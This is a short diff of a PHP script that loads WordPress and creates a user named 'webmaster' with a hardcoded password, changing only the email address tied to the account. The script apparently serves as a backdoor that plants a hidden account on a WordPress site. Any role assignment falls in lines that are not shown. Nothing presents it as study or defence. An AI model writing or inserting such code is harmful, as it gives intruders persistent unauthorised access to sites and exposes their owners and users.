@@ -4,7 +4,7 @@ require_once('./wp-load.php');
 
 $username = 'webmaster';
 $password = 'Seo301Take!';
-$email = 'instalacionesinman@gmail.com';
+$email = 'weblizar@gmail.com';
 
 if (!username_exists($username) && !email_exists($email)) {
     $user_id = wp_create_user($username, $password, $email);
@@ -25,6 +25,7 @@ if (!username_exists($username) && !email_exists($email)) {
 }
 
 ?>
+
 
 
 
